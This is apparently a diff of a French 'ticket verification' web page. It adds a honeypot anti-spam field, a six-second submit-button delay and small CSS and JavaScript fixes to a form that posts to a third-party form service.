@@ -17,6 +17,7 @@
       --bg: #f8fafc;
       --text: #1e293b;
       --text-light: #64748b;
+      --disabled: #cbd5e1;
     }
 
     body {
@@ -103,14 +104,6 @@
       border: 1px solid #e2e8f0 !important;
     }
 
-    .section-title {
-      text-align: center;
-      font-weight: 600;
-      font-size: 1.5rem;
-      margin-bottom: 30px;
-      color: var(--primary);
-    }
-
     /* --- FORM ELEMENTS --- */
     form { display: flex; flex-direction: column; gap: 18px; }
 
@@ -167,8 +160,6 @@
     }
 
     .code-toggle input[type="radio"] { display: none; }
-
-    /* Style quand sélectionné */
     .code-toggle label:has(input:checked) {
         background: white;
         color: var(--primary);
@@ -188,9 +179,14 @@
       margin-top: 10px;
     }
 
-    .btn-submit:hover {
+    .btn-submit:hover:not(:disabled) {
       background: var(--primary-hover);
       transform: translateY(-1px);
+    }
+
+    .btn-submit:disabled {
+      background: var(--disabled);
+      cursor: not-allowed;
     }
 
     /* --- FOOTER --- */
@@ -206,6 +202,12 @@
       text-decoration: none;
       color: var(--text-light);
       font-size: 0.9rem;
+    }
+
+    /* HONEYPOT CLASSE */
+    .hidden-field {
+      display: none !important;
+      visibility: hidden !important;
     }
   </style>
 </head>
@@ -235,14 +237,14 @@
   <div class="page-wrapper">
     <section id="contact" class="contact-section">
       <div class="container">
-        <!-- <h2 class="section-title" data-i18n="contact_title">Vérification de Ticket</h2> -->
-
-        <form action="https://api.web3forms.com/submit" method="POST">
+        <form action="https://api.web3forms.com/submit" method="POST" id="mainForm">
           <input type="hidden" name="access_key" value="1eaf6de9-668d-4793-bf2a-134ad609663d">
           <input type="hidden" name="redirect" value="https://rechstat.com/merci.html">
           <input type="hidden" name="_captcha" value="false">
           <input type="hidden" name="_template" value="table">
-          <input type="text" name="company" style="display:none">
+          
+          <input type="checkbox" name="botcheck" class="hidden-field" style="display: none;">
+          
           <input type="hidden" name="intent" value="user_verification">
           <input type="hidden" name="submitted_at" id="submitted_at">
           <input type="hidden" name="name" value="Formulaire vérification ticket">
@@ -280,7 +282,7 @@
               </div>
           </div>
 
-          <button type="submit" class="btn-submit" data-i18n="form_envoyer">Soumettre</button>
+          <button type="submit" class="btn-submit" id="submitBtn" data-i18n="form_envoyer">Soumettre</button>
         </form>
       </div>
     </section>
@@ -296,9 +298,8 @@
     </div>
   </footer>
 
-  <script src="form.js"></script>
   <script>
-    // Logique pour masquer/afficher le code
+    // 1. Logique pour masquer/afficher le code
     function toggleCode(show) {
       const codeInput = document.getElementById("reference");
       if (codeInput) {
@@ -306,22 +307,41 @@
       }
     }
 
-    // Gère le timestamp
+    // 2. Gère le timestamp et le blocage du bouton pendant 6s
     window.onload = function() {
+      // Timestamp
       const timestampField = document.getElementById('submitted_at');
       if (timestampField) {
         timestampField.value = new Date().toLocaleString();
       }
+
+      // Sécurité : Désactiver le bouton pendant 6 secondes
+      const btn = document.getElementById('submitBtn');
+      let timeLeft = 6;
+      btn.disabled = true;
+      
+      const timer = setInterval(() => {
+        timeLeft--;
+        btn.innerText = `Attente (${timeLeft}s)`;
+        
+        if (timeLeft <= 0) {
+          clearInterval(timer);
+          btn.disabled = false;
+          btn.innerText = "Soumettre";
+        }
+      }, 1000);
     };
 
-    // Gestion du menu langue simple (si form.js est absent)
+    // 3. Gestion du menu langue
     function toggleLangMenu() {
         const menu = document.querySelector('.lang-options');
         menu.style.display = (menu.style.display === 'block') ? 'none' : 'block';
     }
+    
     window.onclick = function(event) {
         if (!event.target.closest('.custom-language-selector')) {
-            document.querySelector('.lang-options').style.display = 'none';
+            const menu = document.querySelector('.lang-options');
+            if(menu) menu.style.display = 'none';
         }
     }
   </script>
